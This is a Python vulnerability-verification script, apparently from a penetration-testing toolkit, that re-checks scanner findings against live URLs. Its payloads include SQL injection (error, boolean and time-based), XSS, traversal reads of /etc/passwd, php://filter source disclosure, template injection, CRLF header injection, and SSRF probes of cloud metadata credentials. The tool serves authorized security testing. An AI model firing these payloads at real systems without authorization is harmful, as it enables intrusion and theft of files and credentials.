#!/usr/bin/env python3
"""Cyberpm Precision Pack - verificacao diferencial de achados.

Recebe achados (JSON/JSONL/TSV) de sqlmap, ghauri, dalfox, nuclei, crlfuzz etc.,
reexecuta com CONTROLE + PAYLOAD, compara respostas em 2 rodadas e atribui
veredito e confianca. Somente stdlib. Nao segue redirecionamentos.
"""
from __future__ import annotations

import argparse
import concurrent.futures as futures
import hashlib
import json
import random
import re
import socket
import ssl
import string
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from urllib.error import HTTPError, URLError
from urllib.parse import quote, unquote, urlsplit, urlunsplit
from urllib.request import (HTTPSHandler, HTTPRedirectHandler, ProxyHandler,
                            Request, build_opener)

import findings as F

UA = 'Cyberpm-Verify/1.0 (auditoria autorizada)'
PROBE = 'cyberpm-probe.invalid'
SLEEP = 3
MAXBODY = 262144


# ----------------------------------------------------------------- transporte
class NoRedirect(HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


@dataclass
class Resp:
    url: str
    status: int | None = None
    headers: dict = field(default_factory=dict)
    body: bytes = b''
    ms: float = 0.0
    error: str = ''

    @property
    def text(self):
        return self.body.decode('utf-8', errors='replace')

    @property
    def digest(self):
        return hashlib.sha256(self.body).hexdigest()[:16]


class Client:
    def __init__(self, timeout=8.0, headers=None, proxy='', insecure=True,
                 rate=0.0, retries=1):
        handlers = [NoRedirect()]
        if proxy:
            handlers.append(ProxyHandler({'http': proxy, 'https': proxy}))
        ctx = ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        handlers.append(HTTPSHandler(context=ctx))
        self.opener = build_opener(*handlers)
        self.timeout = timeout
        self.retries = retries
        self.rate = rate
        self.base_headers = {'User-Agent': UA, 'Accept': '*/*'}
        if headers:
            self.base_headers.update(headers)
        self._lock = threading.Lock()
        self._last = 0.0

    def _wait(self):
        if self.rate <= 0:
            return
        with self._lock:
            delta = time.monotonic() - self._last
            if delta < self.rate:
                time.sleep(self.rate - delta)
            self._last = time.monotonic()

    def fetch(self, url, method='GET', headers=None, body=None, timeout=None, retries=None):
        hdrs = dict(self.base_headers)
        if headers:
            hdrs.update({k: v for k, v in headers.items() if v is not None})
        limit = self.retries if retries is None else retries
        last = Resp(url=url, error='sem tentativa')
        for attempt in range(limit + 1):
            self._wait()
            start = time.monotonic()
            req = Request(url, data=body, headers=hdrs, method=method)
            try:
                try:
                    resp = self.opener.open(req, timeout=timeout or self.timeout)
                except HTTPError as exc:
                    resp = exc
                with resp:
                    data = resp.read(MAXBODY + 1)
                    return Resp(url=url, status=resp.code,
                                headers={k.lower(): v for k, v in resp.headers.items()},
                                body=data[:MAXBODY],
                                ms=(time.monotonic() - start) * 1000.0)
            except (URLError, TimeoutError, OSError, ValueError, ssl.SSLError) as exc:
                last = Resp(url=url, ms=(time.monotonic() - start) * 1000.0,
                            error=f'{type(exc).__name__}: {str(exc)[:160]}')
                if attempt < limit:
                    time.sleep(0.4 * (attempt + 1))
        return last


# ----------------------------------------------------------------- utilidades
def set_param(url, param, value, encode=True):
    parts = urlsplit(url)
    encoded = quote(value, safe='') if encode else value
    out, replaced = [], False
    for seg in (parts.query.split('&') if parts.query else []):
        key = seg.split('=', 1)[0]
        if key == param:
            out.append(key + '=' + encoded)
            replaced = True
        else:
            out.append(seg)
    if not replaced:
        out.append(param + '=' + encoded)
    return urlunsplit(parts._replace(query='&'.join(out)))


def param_value(url, param):
    for seg in urlsplit(url).query.split('&'):
        if not seg:
            continue
        key, _, val = seg.partition('=')
        if key == param:
            return unquote(val)
    return ''


def differs(a, b, ratio=0.05):
    if a.status is None or b.status is None:
        return False
    if a.status != b.status:
        return True
    la, lb = len(a.body), len(b.body)
    if abs(la - lb) > max(48, ratio * max(la, lb, 1)):
        return True
    return a.digest != b.digest


def curl(url, method='GET', headers=None, follow=False):
    parts = ['curl', '-sk', '-D', '-', '-o', '/dev/null']
    if follow:
        parts.append('-L')
    if method != 'GET':
        parts += ['-X', method]
    for key, value in (headers or {}).items():
        parts += ['-H', f"'{key}: {value}'"]
    parts.append("'" + url + "'")
    return ' '.join(parts)


def verdict(conf):
    if conf >= 90:
        return 'confirmado'
    if conf >= 70:
        return 'provavel'
    if conf >= 45:
        return 'possivel'
    return 'nao_reproduzido'


def resolves(name):
    try:
        socket.gethostbyname_ex(name)
        return True
    except (socket.gaierror, OSError):
        return False


@dataclass
class Ctx:
    timeout: float = 8.0
    deep: bool = False
    oob: str = ''
    origin: str = 'https://' + PROBE


# ----------------------------------------------------------------- SQLi
SQL_SIGS = (
    'you have an error in your sql syntax', 'warning: mysql', 'sqlstate[',
    'unclosed quotation mark after the character string', 'quoted string not properly terminated',
    'pg_query()', 'pgsqlexception', 'psqlexception', 'syntax error at or near',
    'sqlite3.operationalerror', 'sqlite_error', 'sqliteexception',
    'microsoft ole db provider for sql server', 'ora-01756', 'ora-00933',
    'invalid use of group function', 'myodbc', 'jdbc', 'division by zero',
)
TIME_PAYLOADS = (
    ("' AND SLEEP({n})-- -", 'MySQL'),
    ("' AND pg_sleep({n})-- -", 'PostgreSQL'),
    ("'; WAITFOR DELAY '0:0:{n}'-- -", 'SQL Server'),
    ("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('CYB',{n})-- -", 'Oracle'),
)
BOOL_PAIRS = (
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- -", "' AND 1=2-- -"),
    (" AND 1=1", " AND 1=2"),
)


def _sigs(text):
    low = text.lower()
    return [sig for sig in SQL_SIGS if sig in low]


def v_sqli(c, f, ctx):
    url, param = f['url'], f['param']
    orig = param_value(url, param)
    base = c.fetch(url)
    if base.status is None:
        return F.veredito('inconclusivo', 0, {'erro': base.error}, curl(url))
    base_sigs = set(_sigs(base.text))
    ev = {'controle': {'status': base.status, 'bytes': len(base.body)}}

    for suffix in ("'", '"', "')", "'-- -"):
        target = set_param(url, param, orig + suffix)
        r = c.fetch(target)
        if r.status is None:
            continue
        novos = [s for s in _sigs(r.text) if s not in base_sigs]
        if novos:
            ev.update({'payload': orig + suffix, 'status': r.status, 'assinaturas': novos[:4]})
            return F.veredito('confirmado', 88, ev, curl(target), 'erro de banco induzido pelo payload')

    for t, fa in BOOL_PAIRS:
        rt = c.fetch(set_param(url, param, orig + t))
        rf = c.fetch(set_param(url, param, orig + fa))
        if rt.status is None or rf.status is None or not differs(rt, rf):
            continue
        rt2 = c.fetch(set_param(url, param, orig + t))
        rf2 = c.fetch(set_param(url, param, orig + fa))
        if differs(rt2, rf2):
            ev.update({'payload_verdadeiro': orig + t, 'payload_falso': orig + fa,
                       'status': [rt.status, rf.status], 'bytes': [len(rt.body), len(rf.body)]})
            return F.veredito('confirmado', 84, ev,
                              curl(set_param(url, param, orig + t)) + "   # comparar com " + repr(fa),
                              'resposta muda entre condicao verdadeira e falsa (confirmado em 2 rodadas)')

    if ctx.deep:
        for tpl, engine in TIME_PAYLOADS:
            payload = orig + tpl.format(n=SLEEP)
            r = c.fetch(set_param(url, param, payload), timeout=ctx.timeout + SLEEP + 4)
            if r.status is None:
                continue
            if r.ms - base.ms >= (SLEEP - 0.6) * 1000:
                ev.update({'payload': payload, 'engine': engine,
                           'ms_controle': round(base.ms), 'ms_payload': round(r.ms)})
                return F.veredito('confirmado', 92, ev, curl(set_param(url, param, payload)),
                                  'atraso proporcional ao SLEEP (' + engine + ')')
    return F.veredito('nao_reproduzido', 20, ev, curl(url), 'sem diferenca reproduzivel')


# ----------------------------------------------------------------- XSS
XSS_PAYLOADS = ('cybpm7"><x>', "cybpm7'><x>")
SENTINEL = 'cybpm7'


def _context(text, index):
    before = text[max(0, index - 300):index]
    if before.rfind('<script') > before.rfind('</script'):
        return 'script'
    if re.search(r'=\s*["\'][^"\']*$', before):
        return 'atributo'
    return 'texto'


def v_xss(c, f, ctx):
    url, param = f['url'], f['param']
    orig = param_value(url, param)
    base = c.fetch(url)
    if base.status is None:
        return F.veredito('inconclusivo', 0, {'erro': base.error}, curl(url))
    melhor = None
    for payload in XSS_PAYLOADS:
        target = set_param(url, param, orig + payload)
        r = c.fetch(target)
        if r.status is None:
            continue
        raw = SENTINEL + payload[len(SENTINEL):]
        idx = r.text.find(SENTINEL)
        if idx < 0:
            continue
        contexto = _context(r.text, idx)
        ev = {'payload': payload, 'status': r.status, 'contexto': contexto}
        if raw in r.text:
            conf = 92 if contexto == 'texto' else (85 if contexto == 'atributo' else 72)
            cand = F.veredito(verdict(conf), conf, ev, curl(target),
                              'markup refletido sem codificacao em contexto de ' + contexto)
        elif SENTINEL + '&lt;x&gt;' in r.text or '&lt;x&gt;' in r.text:
            cand = F.veredito('refletido', 45, ev, curl(target),
                              'refletido mas com < > codificados; avaliar contexto')
        else:
            continue
        if melhor is None or cand['confianca'] > melhor['confianca']:
            melhor = cand
    return melhor or F.veredito('nao_reproduzido', 15, {'controle': base.status}, curl(url),
                                'marcador nao refletido')


# ----------------------------------------------------------------- open redirect
def v_open_redirect(c, f, ctx):
    url, param = f['url'], f['param']
    orig = param_value(url, param)
    tentativas = []
    for payload in ('https://' + PROBE + '/', '//' + PROBE, '/\\/' + PROBE):
        for encode in (True, False):
            tentativas.append((payload, set_param(url, param, payload, encode=encode)))
    for payload, target in tentativas:
        r = c.fetch(target)
        if r.status is None:
            continue
        loc = r.headers.get('location', '')
        if loc and urlsplit(loc).hostname == PROBE:
            return F.veredito('confirmado', 95, {'payload': payload, 'status': r.status, 'location': loc},
                              curl(target), 'Location aponta para host externo controlado')
        if loc and PROBE in loc:
            return F.veredito('provavel', 75, {'payload': payload, 'status': r.status, 'location': loc},
                              curl(target), 'payload refletido no Location')
        if r.status in (301, 302, 303, 307, 308) and PROBE in r.text:
            return F.veredito('possivel', 55, {'payload': payload, 'status': r.status}, curl(target),
                              'redirecionamento presente; validar manualmente')
    return F.veredito('nao_reproduzido', 15, {}, curl(url), 'Location nao reflete o payload')


# ----------------------------------------------------------------- CORS
def v_cors(c, f, ctx):
    url = f['url']
    r = c.fetch(url, headers={'Origin': ctx.origin})
    if r.status is None:
        return F.veredito('inconclusivo', 0, {'erro': r.error}, curl(url))
    acao = r.headers.get('access-control-allow-origin', '')
    acac = r.headers.get('access-control-allow-credentials', '').lower()
    ev = {'origem_enviada': ctx.origin, 'acao': acao, 'acac': acac, 'status': r.status}
    if acao == ctx.origin and acac == 'true':
        return F.veredito('confirmado', 95, ev, curl(url, headers={'Origin': ctx.origin}),
                          'origem arbitraria refletida COM credenciais')
    if acao == ctx.origin:
        return F.veredito('provavel', 72, ev, curl(url, headers={'Origin': ctx.origin}),
                          'origem arbitraria refletida sem credenciais')
    if acao == '*':
        return F.veredito('possivel', 40, ev, curl(url), 'ACAO curinga')
    if acao == 'null':
        return F.veredito('possivel', 60, ev, curl(url), 'origem null aceita')
    r2 = c.fetch(url, headers={'Origin': 'null'})
    if r2.headers.get('access-control-allow-origin') == 'null':
        return F.veredito('possivel', 65, dict(ev, origem_null='aceita'), curl(url, headers={'Origin': 'null'}),
                          'origem null aceita; validar bypass por sandbox')
    return F.veredito('nao_reproduzido', 20, ev, curl(url), 'sem cabecalho CORS relevante')


# ----------------------------------------------------------------- LFI
LFI_PAYLOADS = ('../../../../etc/passwd', '..%2f..%2f..%2f..%2fetc%2fpasswd',
                '....//....//....//etc/passwd', '/etc/passwd')


def v_lfi(c, f, ctx):
    url, param = f['url'], f['param']
    base = c.fetch(url)
    if base.status is None:
        return F.veredito('inconclusivo', 0, {'erro': base.error}, curl(url))
    base_has = 'root:x:0:0' in base.text
    for payload in LFI_PAYLOADS:
        for encode in (False, True):
            target = set_param(url, param, payload, encode=encode)
            r = c.fetch(target)
            if r.status is None or 'root:x:0:0' not in r.text:
                continue
            conf = 70 if base_has else 95
            return F.veredito(verdict(conf), conf, {'payload': payload, 'status': r.status},
                              curl(target), 'conteudo de /etc/passwd retornado')
    payload = 'php://filter/convert.base64-encode/resource=index.php'
    r = c.fetch(set_param(url, param, payload, encode=False))
    if r.status is not None:
        try:
            import base64
            decoded = base64.b64decode(re.sub(r'[^A-Za-z0-9+/=]', '', r.text), validate=False)
            if b'<?php' in decoded:
                return F.veredito('confirmado', 85, {'payload': payload, 'status': r.status},
                                  curl(set_param(url, param, payload, encode=False)),
                                  'wrapper php://filter retornou codigo-fonte')
        except (ValueError, TypeError):
            pass
    return F.veredito('nao_reproduzido', 15, {}, curl(url), 'sem marcador de LFI')


# ----------------------------------------------------------------- SSTI
SSTI_TESTS = (('{{7*7}}', '49', 'Jinja2/Twig/Nunjucks'), ('${7*7}', '49', 'Freemarker/JSP/Thymeleaf'),
              ('#{7*7}', '49', 'Ruby/Java EL'), ('<%= 7*7 %>', '49', 'ERB/EJS'),
              ("{{7*'7'}}", '7777777', 'Jinja2 (string repeat)'), ("{{7*'7'}}", '49', 'Twig (numerico)'))


def v_ssti(c, f, ctx):
    url, param = f['url'], f['param']
    orig = param_value(url, param)
    base = c.fetch(url)
    if base.status is None:
        return F.veredito('inconclusivo', 0, {'erro': base.error}, curl(url))
    if 'cybpm49' in base.text:
        return F.veredito('inconclusivo', 10, {}, curl(url), 'marcador ja presente no controle')
    for tpl, expected, engine in SSTI_TESTS:
        payload = 'cybpm' + tpl
        target = set_param(url, param, payload)
        r = c.fetch(target)
        if r.status is None:
            continue
        if 'cybpm' + expected in r.text:
            return F.veredito('confirmado', 90, {'payload': payload, 'status': r.status, 'engine': engine},
                              curl(target), 'expressao avaliada no servidor (' + engine + ')')
        if payload in r.text:
            return F.veredito('refletido', 35, {'payload': payload, 'status': r.status}, curl(target),
                              'payload refletido literalmente, sem avaliacao')
    return F.veredito('nao_reproduzido', 15, {}, curl(url), 'sem avaliacao de expressao')


# ----------------------------------------------------------------- CRLF
def v_crlf(c, f, ctx):
    url, param = f['url'], f['param']
    orig = param_value(url, param)
    testes = (('%0d%0aX-Cyberpm-Probe:%20ok', 'CRLF'),
              ('%0aX-Cyberpm-Probe:%20ok', 'LF'),
              ('%0d%0aSet-Cookie:%20cybpm=1', 'CRLF+Set-Cookie'))
    for raw, label in testes:
        target = set_param(url, param, orig + raw, encode=False)
        r = c.fetch(target)
        if r.status is None:
            continue
        if r.headers.get('x-cyberpm-probe') or 'cybpm=1' in r.headers.get('set-cookie', ''):
            return F.veredito('confirmado', 95, {'payload': raw, 'injecao': label, 'status': r.status,
                                                 'headers': {k: v for k, v in r.headers.items()
                                                             if k.startswith('x-cyberpm') or k == 'set-cookie'}},
                              curl(target), 'cabecalho injetado apareceu na resposta')
    return F.veredito('nao_reproduzido', 15, {}, curl(url), 'nenhum cabecalho injetado')


# ----------------------------------------------------------------- SSRF
def v_ssrf(c, f, ctx):
    url, param = f['url'], f['param']
    base = c.fetch(url)
    if ctx.oob:
        label = 'cyb' + ''.join(random.choices(string.ascii_lowercase, k=8))
        payload = f'http://{label}.{ctx.oob}/'
        r = c.fetch(set_param(url, param, payload), timeout=ctx.timeout + 6)
        ev = {'payload': payload, 'label': label, 'status': r.status, 'oob': ctx.oob}
        if r.status is not None and resolves(f'{label}.{ctx.oob}'):
            return F.veredito('confirmado', 88, ev, curl(set_param(url, param, payload)),
                              'callback OOB: confirmar no painel do interactsh')
        return F.veredito('provavel', 60, ev, curl(set_param(url, param, payload)),
                          'sem confirmacao OOB; verificar interactsh')
    for payload in ('http://169.254.169.254/latest/meta-data/', 'http://127.0.0.1/',
                    'http://localhost/'):
        r = c.fetch(set_param(url, param, payload))
        if r.status is None:
            continue
        if any(m in r.text for m in ('ami-', 'security-credentials', 'iam/')):
            return F.veredito('confirmado', 90, {'payload': payload, 'status': r.status},
                              curl(set_param(url, param, payload)), 'metadata de nuvem retornado')
        if differs(base, r):
            return F.veredito('provavel', 62, {'payload': payload, 'status': r.status},
                              curl(set_param(url, param, payload)), 'resposta difere do controle')
    return F.veredito('inconclusivo', 25, {}, curl(url), 'sem OOB; heuristica fraca')


# ----------------------------------------------------------------- metodos / host / headers
def v_methods(c, f, ctx):
    url = f['url']
    r = c.fetch(url, method='OPTIONS')
    allow = r.headers.get('allow', '')
    ev = {'allow': allow, 'testados': {}}
    for method in ('PUT', 'DELETE', 'PATCH', 'TRACE'):
        if allow and method not in allow.upper():
            continue
        rr = c.fetch(url, method=method)
        if rr.status is not None and 200 <= rr.status < 300:
            ev['testados'][method] = rr.status
    if not ev['testados']:
        return F.veredito('nao_reproduzido', 20, ev, curl(url, 'OPTIONS'), 'nenhum metodo extra ativo')
    if 'TRACE' in ev['testados']:
        return F.veredito('confirmado', 70, ev, curl(url, 'TRACE'), 'TRACE habilitado (XST)')
    return F.veredito('possivel', 55, ev, curl(url, 'OPTIONS'), 'metodos habilitados: ' + ', '.join(ev['testados']))


def v_host_header(c, f, ctx):
    url = f['url']
    r = c.fetch(url, headers={'Host': PROBE})
    if r.status is None:
        return F.veredito('inconclusivo', 0, {'erro': r.error}, curl(url, headers={'Host': PROBE}))
    loc = r.headers.get('location', '')
    ev = {'host_enviado': PROBE, 'status': r.status, 'location': loc,
          'refletido_corpo': PROBE in r.text}
    if PROBE in loc or PROBE in r.text:
        return F.veredito('provavel', 78, ev, curl(url, headers={'Host': PROBE}),
                          'Host arbitrario refletido; validar reset de senha / cache')
    return F.veredito('nao_reproduzido', 20, ev, curl(url), 'Host nao refletido')


SEC_HEADERS = {
    'strict-transport-security': 'HSTS',
    'content-security-policy': 'CSP',
    'x-content-type-options': 'X-Content-Type-Options',
    'referrer-policy': 'Referrer-Policy',
    'permissions-policy': 'Permissions-Policy',
}


def v_headers(c, f, ctx):
    url = f['url']
    r = c.fetch(url)
    if r.status is None:
        return F.veredito('inconclusivo', 0, {'erro': r.error}, curl(url))
    faltando = [nome for chave, nome in SEC_HEADERS.items() if chave not in r.headers]
    csp = r.headers.get('content-security-policy', '')
    if 'x-frame-options' not in r.headers and 'frame-ancestors' not in csp:
        faltando.append('X-Frame-Options/frame-ancestors')
    if not faltando:
        return F.veredito('confirmado', 20, {'ausentes': []}, curl(url), 'todos os cabecalhos presentes')
    conf = 45 + min(30, 5 * len(faltando))
    return F.veredito('possivel', conf, {'ausentes': faltando, 'status': r.status}, curl(url),
                      'cabecalhos ausentes: ' + ', '.join(faltando))


VERIFIERS = {
    'sqli': v_sqli, 'xss': v_xss, 'open_redirect': v_open_redirect, 'cors': v_cors,
    'lfi': v_lfi, 'ssti': v_ssti, 'crlf': v_crlf, 'ssrf': v_ssrf,
    'methods': v_methods, 'host_header': v_host_header, 'headers': v_headers,
}


# ----------------------------------------------------------------- entrada
def load_findings(path):
    text = Path(path).read_text(encoding='utf-8', errors='replace').strip()
    if not text:
        return []
    if text[0] in '[{':
        try:
            data = json.loads(text)
        except ValueError:
            data = [json.loads(l) for l in text.splitlines() if l.strip()]
    else:
        data = [json.loads(l) for l in text.splitlines() if l.strip().startswith('{')]
    if isinstance(data, dict):
        data = data.get('achados', [data])
    return data


def normalize(raw, default_classe=''):
    if not isinstance(raw, dict):
        return None
    classe = raw.get('classe') or raw.get('class') or raw.get('tipo') or raw.get('type') or default_classe
    classe = F._norm_class(classe) or F._norm_class(raw.get('nome') or '')
    url = raw.get('url') or raw.get('alvo') or raw.get('target') or raw.get('endpoint')
    if not classe or not url or classe not in VERIFIERS:
        return None
    param = raw.get('param') or raw.get('parametro') or raw.get('parameter') or raw.get('p') or ''
    if not param:
        query = urlsplit(str(url)).query
        param = query.split('&')[0].split('=', 1)[0] if query else 'p'
    return {'classe': classe, 'url': str(url), 'param': param,
            'payload': raw.get('payload') or '', 'origem': raw.get('origem') or raw.get('tool') or 'externo'}


def from_url(url, classes):
    """Gera achados a partir dos parametros da propria URL."""
    query = urlsplit(url).query
    params = [seg.split('=', 1)[0] for seg in query.split('&') if seg] or ['p']
    return [{'classe': classe, 'url': url, 'param': param, 'payload': '', 'origem': 'direto'}
            for classe in classes for param in params]


# ----------------------------------------------------------------- main
def main():
    parser = argparse.ArgumentParser(description='Verificacao diferencial de achados (Cyberpm).')
    parser.add_argument('--input', '-i', help='achados em JSON, JSONL ou TSV')
    parser.add_argument('--url', '-u', help='alvo direto (usa os parametros da URL)')
    parser.add_argument('--classes', default='sqli,xss,open_redirect,cors,lfi,ssti,crlf,ssrf,methods,host_header,headers')
    parser.add_argument('--out', '-o', default='verify_out')
    parser.add_argument('--min-confidence', type=int, default=0)
    parser.add_argument('--only', default='', help='filtra classes, ex: sqli,xss')
    parser.add_argument('--deep', action='store_true', help='inclui testes baseados em tempo')
    parser.add_argument('--oob', default='', help='dominio interactsh para testes out-of-band')
    parser.add_argument('--timeout', type=float, default=8.0)
    parser.add_argument('--workers', type=int, default=6)
    parser.add_argument('--rate', type=float, default=0.0, help='intervalo minimo entre requisicoes')
    parser.add_argument('--proxy', default='')
    parser.add_argument('--header', action='append', default=[], help='cabecalho extra K:V')
    parser.add_argument('--verify-tls', action='store_true')
    parser.add_argument('--fail-on', choices=('nenhum', 'confirmado', 'alto'), default='nenhum')
    args = parser.parse_args()

    if args.input:
        achados = [n for n in (normalize(r) for r in load_findings(args.input)) if n]
    elif args.url:
        achados = from_url(args.url, [c.strip() for c in args.classes.split(',') if c.strip()])
    else:
        parser.error('informe --input ou --url')

    if args.only:
        permitidas = {c.strip() for c in args.only.split(',')}
        achados = [a for a in achados if a['classe'] in permitidas]
    if not achados:
        print('[!] nenhum achado verificavel', flush=True)
        return 0

    headers = {}
    for item in args.header:
        key, _, value = item.partition(':')
        headers[key.strip()] = value.strip()

    client = Client(timeout=args.timeout, headers=headers, proxy=args.proxy,
                    insecure=not args.verify_tls, rate=args.rate)
    ctx = Ctx(timeout=args.timeout, deep=args.deep, oob=args.oob)
    alvo = args.url or achados[0]['url']
    print(f'[·] verificando {len(achados)} achado(s) com {args.workers} workers', flush=True)

    resultados = []
    lock = threading.Lock()

    def trabalho(item):
        verifier = VERIFIERS[item['classe']]
        try:
            res = verifier(client, item, ctx)
        except Exception as exc:  # um verificador nao derruba a execucao
            res = F.veredito('inconclusivo', 0, {'excecao': type(exc).__name__ + ': ' + str(exc)[:120]},
                             '', 'falha do verificador')
        achado = F.make_finding(item['classe'], item['url'], item['param'], item['payload'],
                                res['veredito'], res['confianca'], res['evidencia'],
                                res['reproducao'], item['origem'], res['nota'])
        with lock:
            resultados.append(achado)
            marca = {'confirmado': 'OK ', 'provavel': '~~ ', 'possivel': '·  ',
                     'refletido': '·  ', 'nao_reproduzido': 'x  ', 'inconclusivo': '?  '}[achado['veredito']]
            print(f'[{marca}] {achado["classe"]:<14} {achado["veredito"]:<16} '
                  f'{achado["confianca"]:>3}%  {achado["url"][:90]}', flush=True)

    with futures.ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
        list(pool.map(trabalho, achados))

    itens = F.dedupe(resultados)
    itens = [i for i in itens if i['confianca'] >= args.min_confidence]
    arquivos = F.export(itens, args.out, alvo)
    resumo = F.summarize(itens)
    print('[·] resumo: ' + json.dumps(resumo, ensure_ascii=False), flush=True)
    print('[·] saidas: ' + ', '.join(arquivos), flush=True)

    if args.fail_on == 'confirmado' and resumo['confirmados']:
        return 1
    if args.fail_on == 'alto' and any(i['severidade'] in ('alto', 'critico') and
                                      i['veredito'] == 'confirmado' for i in itens):
        return 1
    return 0


if __name__ == '__main__':
    raise SystemExit(main())